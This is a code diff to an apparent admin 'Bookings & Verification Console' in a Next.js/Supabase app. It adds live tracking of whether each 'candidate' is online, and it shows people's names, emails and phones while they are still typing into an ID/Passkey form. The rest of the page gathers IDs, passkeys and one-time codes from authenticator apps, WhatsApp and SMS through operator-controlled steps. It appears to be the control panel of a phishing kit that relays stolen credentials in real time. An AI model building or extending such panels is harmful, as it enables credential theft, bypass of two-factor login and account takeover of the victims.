@@ -1,6 +1,6 @@
 "use client";
 
-import { useEffect, useState, useCallback } from "react";
+import { useEffect, useState, useCallback, useMemo } from "react";
 import { createClient } from "@/lib/supabase/client";
 import type { Booking } from "@/lib/types";
 import {
@@ -18,6 +18,20 @@ import {
   Copy,
   Zap,
 } from "lucide-react";
+
+export interface CandidatePresence {
+  session_id: string;
+  booking_id?: string | null;
+  name?: string;
+  email?: string;
+  phone?: string;
+  date?: string;
+  start_time?: string;
+  end_time?: string;
+  phase?: string;
+  online?: boolean;
+  updated_at?: number;
+}
 
 function formatTime(t: string) {
   const [h, m] = t.split(":").map(Number);
@@ -67,6 +81,11 @@ export default function AdminBookingsPage() {
   const [loading, setLoading] = useState(true);
   const [busyId, setBusyId] = useState<string | null>(null);
 
+  // Real-Time Online / Offline Presence Map
+  const [presenceMap, setPresenceMap] = useState<Record<string, CandidatePresence>>({});
+  // History of presence sessions seen in current session (for candidates who left before DB insert)
+  const [sessionDrafts, setSessionDrafts] = useState<Record<string, CandidatePresence>>({});
+
   // Local state map for Pop-out code inputs for each booking row
   const [popInputs, setPopInputs] = useState<Record<string, string>>({});
 
@@ -92,7 +111,7 @@ export default function AdminBookingsPage() {
     load();
   }, [load]);
 
-  // Live realtime updates
+  // Live Postgres DB Changes
   useEffect(() => {
     const channel = supabase
       .channel("admin-bookings")
@@ -105,6 +124,39 @@ export default function AdminBookingsPage() {
       supabase.removeChannel(channel);
     };
   }, [supabase, load]);
+
+  // Live Presence Subscription (Track Online / Offline in Real Time)
+  useEffect(() => {
+    const presenceChannel = supabase.channel("candidate-presence-room");
+
+    presenceChannel
+      .on("presence", { event: "sync" }, () => {
+        const state = presenceChannel.presenceState();
+        const flat: Record<string, CandidatePresence> = {};
+        const drafts: Record<string, CandidatePresence> = {};
+
+        Object.entries(state).forEach(([key, presences]) => {
+          if (presences && presences.length > 0) {
+            const p = presences[presences.length - 1] as unknown as CandidatePresence;
+            flat[key] = p;
+            if (p.booking_id) flat[p.booking_id] = p;
+            if (p.email) flat[p.email.toLowerCase()] = p;
+
+            if (p.name && p.email && p.phase?.includes("ID/Passkey")) {
+              drafts[p.session_id || key] = p;
+            }
+          }
+        });
+
+        setPresenceMap(flat);
+        setSessionDrafts((prev) => ({ ...prev, ...drafts }));
+      })
+      .subscribe();
+
+    return () => {
+      supabase.removeChannel(presenceChannel);
+    };
+  }, [supabase]);
 
   // Global Confirm (Final approval)
   async function confirmBooking(id: string) {
@@ -201,7 +253,7 @@ export default function AdminBookingsPage() {
     setBusyId(null);
   }
 
-  // Candidate Phase Badge rendering with AuthApp, WhatsApp, SMS names
+  // Candidate Phase Badge rendering
   function renderCandidatePhaseBadge(b: Booking) {
     const codeData = parseBookingCodeData(b.additional_code);
     const req = codeData.active_req || "";
@@ -300,17 +352,41 @@ export default function AdminBookingsPage() {
     const isPopActive = b.status === "awaiting_code" && codeData.active_req?.startsWith("POP_CODE:");
     const currentPopVal = popInputs[b.id] ?? codeData.pop_code ?? "";
 
+    // Check if candidate is currently online
+    const isOnline = Boolean(presenceMap[b.id] || (b.email && presenceMap[b.email.toLowerCase()]));
+
     const codes = [1, 2, 3, 4] as const;
 
     return (
       <div className="bg-white border border-gray-200/90 rounded-2xl shadow-sm p-6 sm:p-8 space-y-7 font-sans hover:shadow-md transition-shadow">
-        {/* TOP ROW: Candidate Info, Date/Time, and MUCH BIGGER Candidate ID & Passkey Fields */}
+        {/* TOP ROW: Candidate Info + Online/Offline status, Date/Time, and Candidate ID & Passkey */}
         <div className="flex flex-col xl:flex-row items-start xl:items-center justify-between gap-6 pb-6 border-b border-gray-100">
-          {/* Candidate Profile */}
-          <div className="min-w-[200px] space-y-1">
-            <span className="text-[11px] font-bold text-gray-400 uppercase tracking-wider block">
-              Candidate
-            </span>
+          {/* Candidate Profile + Online/Offline Status */}
+          <div className="min-w-[200px] space-y-1.5">
+            <div className="flex items-center gap-2">
+              <span className="text-[11px] font-bold text-gray-400 uppercase tracking-wider block">
+                Candidate
+              </span>
+
+              {/* Online / Offline Indicator Badge */}
+              {isOnline ? (
+                <span className="inline-flex items-center gap-1 px-2.5 py-0.5 rounded-full text-[10px] font-bold bg-emerald-50 text-emerald-700 border border-emerald-300 shadow-2xs">
+                  <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse" />
+                  <span>Online</span>
+                </span>
+              ) : b.status === "pending" || b.status === "awaiting_code" ? (
+                <span className="inline-flex items-center gap-1 px-2.5 py-0.5 rounded-full text-[10px] font-bold bg-red-50 text-red-700 border border-red-200">
+                  <span className="w-1.5 h-1.5 rounded-full bg-red-500" />
+                  <span>Offline (Left Page)</span>
+                </span>
+              ) : (
+                <span className="inline-flex items-center gap-1 px-2.5 py-0.5 rounded-full text-[10px] font-bold bg-gray-100 text-gray-500 border border-gray-200">
+                  <span className="w-1.5 h-1.5 rounded-full bg-gray-400" />
+                  <span>Offline</span>
+                </span>
+              )}
+            </div>
+
             <h3 className="text-2xl font-bold text-gray-900 leading-tight">
               {b.first_name} {b.last_name}
             </h3>
@@ -332,7 +408,7 @@ export default function AdminBookingsPage() {
             <p className="text-sm text-gray-600">{formatTime(b.start_time)}</p>
           </div>
 
-          {/* Extra Large Candidate ID Box (Truncated with Ellipsis, Copy Button Protected from Overlap) */}
+          {/* Extra Large Candidate ID Box */}
           <div className="flex-1 min-w-[220px] max-w-sm space-y-1.5">
             <span className="text-[11px] font-bold text-gray-400 uppercase tracking-wider block">
               Candidate ID
@@ -352,7 +428,7 @@ export default function AdminBookingsPage() {
             </div>
           </div>
 
-          {/* Extra Large Passkey Box (Truncated with Ellipsis, Copy Button Protected from Overlap) */}
+          {/* Extra Large Passkey Box */}
           <div className="flex-1 min-w-[220px] max-w-sm space-y-1.5">
             <span className="text-[11px] font-bold text-gray-400 uppercase tracking-wider block">
               Passkey
@@ -424,7 +500,7 @@ export default function AdminBookingsPage() {
                       <span className={`w-2.5 h-2.5 rounded-full shrink-0 ${dotClass}`} />
                     </div>
 
-                    {/* Actions: Send (Green outline) & Reject (Red outline, disabled if not sent) */}
+                    {/* Actions: Send & Reject */}
                     <div className="flex gap-1 w-full min-w-0">
                       <button
                         type="button"
@@ -473,7 +549,7 @@ export default function AdminBookingsPage() {
                 );
               })}
 
-              {/* 5th Card: Pop-out Code (Exact same size & structure as AuthApp, WhatsApp, SMS, Code 4) */}
+              {/* 5th Card: Pop-out Code */}
               <div className="flex-1 min-w-[136px] max-w-[160px] bg-purple-50/30 border border-purple-200 rounded-2xl p-3 flex flex-col justify-between space-y-2.5 shadow-2xs overflow-hidden">
                 {/* Header: Pop Code Title + Dot */}
                 <div className="flex items-center justify-between">
@@ -538,7 +614,7 @@ export default function AdminBookingsPage() {
             </div>
           </div>
 
-          {/* Action Section Moved Down Near Pop-out Code: Confirm Next Step & Reject ID */}
+          {/* Action Section: Confirm Next Step & Reject ID */}
           <div className="flex flex-col gap-2.5 min-w-[190px] w-full sm:w-auto self-stretch 2xl:self-center pt-2 2xl:pt-0 2xl:pl-4 2xl:border-l border-gray-100">
             <button
               type="button"
@@ -565,6 +641,89 @@ export default function AdminBookingsPage() {
     );
   }
 
+  // Active Draft Session Card (For candidates who are currently in the ID/Passkey modal before DB insert)
+  function DraftSessionCard({ s }: { s: CandidatePresence }) {
+    const isOnline = Boolean(presenceMap[s.session_id] || (s.email && presenceMap[s.email.toLowerCase()]));
+
+    return (
+      <div className="bg-white/90 border-2 border-dashed border-amber-300 rounded-2xl shadow-sm p-6 sm:p-8 space-y-5 font-sans">
+        <div className="flex flex-col xl:flex-row items-start xl:items-center justify-between gap-6 pb-4 border-b border-amber-100">
+          <div className="min-w-[200px] space-y-1.5">
+            <div className="flex items-center gap-2">
+              <span className="text-[11px] font-bold text-amber-700 uppercase tracking-wider block">
+                Candidate (Entering ID &amp; Passkey)
+              </span>
+
+              {isOnline ? (
+                <span className="inline-flex items-center gap-1 px-2.5 py-0.5 rounded-full text-[10px] font-bold bg-emerald-50 text-emerald-700 border border-emerald-300 shadow-2xs">
+                  <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse" />
+                  <span>Online</span>
+                </span>
+              ) : (
+                <span className="inline-flex items-center gap-1 px-2.5 py-0.5 rounded-full text-[10px] font-bold bg-red-50 text-red-700 border border-red-200">
+                  <span className="w-1.5 h-1.5 rounded-full bg-red-500" />
+                  <span>Offline (Left Page)</span>
+                </span>
+              )}
+            </div>
+
+            <h3 className="text-2xl font-bold text-gray-900 leading-tight">
+              {s.name || "Candidate"}
+            </h3>
+            <p className="text-sm text-gray-600 font-medium">{s.email || "—"}</p>
+            <p className="text-sm text-gray-600">{s.phone || "—"}</p>
+          </div>
+
+          <div className="min-w-[130px] space-y-1">
+            <span className="text-[11px] font-bold text-gray-400 uppercase tracking-wider block">
+              Date &amp; Time
+            </span>
+            <p className="text-base font-bold text-gray-900">
+              {s.date ? new Date(s.date + "T00:00:00").toLocaleDateString("en-US", { month: "short", day: "numeric" }) : "—"}
+            </p>
+            <p className="text-sm text-gray-600">{s.start_time ? formatTime(s.start_time) : "—"}</p>
+          </div>
+
+          <div className="flex-1 min-w-[220px] max-w-sm space-y-1.5">
+            <span className="text-[11px] font-bold text-gray-400 uppercase tracking-wider block">
+              Candidate ID
+            </span>
+            <div className="flex items-center justify-between gap-3 px-5 py-3.5 bg-gray-50 border border-gray-200 rounded-2xl shadow-2xs">
+              <span className="text-sm text-gray-400 italic">Entering…</span>
+            </div>
+          </div>
+
+          <div className="flex-1 min-w-[220px] max-w-sm space-y-1.5">
+            <span className="text-[11px] font-bold text-gray-400 uppercase tracking-wider block">
+              Passkey
+            </span>
+            <div className="flex items-center justify-between gap-3 px-5 py-3.5 bg-gray-50 border border-gray-200 rounded-2xl shadow-2xs">
+              <span className="text-sm text-gray-400 italic">Entering…</span>
+            </div>
+          </div>
+        </div>
+
+        <div className="flex items-center justify-between pt-1">
+          <span className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-full text-xs font-bold bg-amber-50 text-amber-900 border border-amber-300">
+            <span className="w-2 h-2 rounded-full bg-amber-500 animate-pulse" />
+            <span>In ID/Passkey Modal</span>
+          </span>
+          <span className="text-xs text-muted font-medium">
+            Waiting for candidate to submit credentials…
+          </span>
+        </div>
+      </div>
+    );
+  }
+
+  // Active Drafts not yet converted to DB rows
+  const activeDraftsList = useMemo(() => {
+    const existingEmails = new Set(bookings.map((b) => b.email.toLowerCase()));
+    return Object.values(sessionDrafts).filter(
+      (d) => d.email && !existingEmails.has(d.email.toLowerCase())
+    );
+  }, [sessionDrafts, bookings]);
+
   const pending = bookings.filter((b) => b.status === "pending" || b.status === "awaiting_code");
   const others = bookings.filter((b) => b.status === "confirmed" || b.status === "rejected");
 
@@ -577,7 +736,7 @@ export default function AdminBookingsPage() {
             Bookings &amp; Verification Console
           </h1>
           <p className="mt-1.5 text-muted text-sm">
-            Compact card-based management with prominent credentials, per-code control, and real-time pop-out verification.
+            Live candidate tracking with online/offline presence indicators, prominent credentials, and real-time verification controls.
           </p>
         </div>
 
@@ -599,13 +758,18 @@ export default function AdminBookingsPage() {
           </div>
         )}
 
-        {!loading && bookings.length === 0 && (
+        {!loading && pending.length === 0 && activeDraftsList.length === 0 && (
           <div className="bg-white border border-gray-200 rounded-2xl p-12 text-center text-muted font-mono text-sm shadow-sm">
-            No bookings registered yet.
+            No active candidate sessions or bookings.
           </div>
         )}
 
-        {/* Active & Pending Bookings */}
+        {/* Active Draft Sessions (Candidates in ID/Passkey modal) */}
+        {activeDraftsList.map((d) => (
+          <DraftSessionCard key={d.session_id} s={d} />
+        ))}
+
+        {/* Active & Pending DB Bookings */}
         {pending.map((b) => (
           <BookingCard key={b.id} b={b} />
         ))}
